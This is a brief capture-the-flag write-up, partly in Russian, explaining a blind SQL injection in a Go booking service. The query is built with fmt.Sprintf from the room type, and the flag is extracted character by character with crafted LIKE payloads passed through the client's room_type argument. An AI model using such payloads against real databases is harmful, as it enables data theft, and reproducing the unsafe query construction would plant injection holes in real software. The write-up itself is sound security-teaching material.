# minimal writeup

blind SQL-injection

```go
s.db.Model(&Booking{}).Where(
    fmt.Sprintf("room_type = '%s' AND check_in_date < ? AND check_out_date > ?", req.RoomType), checkOutDate, checkInDate,
).Count(&count)
```

Модифицируем клиент (убираем валидацию), отправляем запросы `./client check ...` с `check_in_date` и `check_out_date` в будущем (чтобы не попасть в флаг по времени).

`--room_type "suite' AND confirmation_number LIKE 'crab{t%' OR created_at=? OR created_at=?);--"`

> Room type **not available** for the selected dates

`--room_type "suite' AND confirmation_number LIKE 'crab{1%' OR created_at=? OR created_at=?);--"`

> Room type **available** for the selected dates

С помощью полученного способа проверки флага посимвольно восстанавливаем его примерно
за 70 запросов на каждый символ. Автоматизируем на любом подручном средстве автоматизации
(или перебираем руками)
